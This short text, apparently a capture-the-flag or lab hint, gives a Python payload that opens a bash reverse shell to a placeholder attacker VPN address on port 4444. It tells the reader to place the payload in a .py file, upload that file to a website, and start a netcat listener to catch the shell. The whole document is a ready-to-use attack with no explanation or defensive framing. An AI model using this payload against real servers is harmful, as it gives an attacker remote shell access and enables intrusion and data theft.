import os
os.system("bash -c 'bash -i >& /dev/tcp/YOUR_VPN_IP/4444 0>&1'")
put it in the .py file

then before uploading the file to the website, set a listener, like nc -lnvp 4444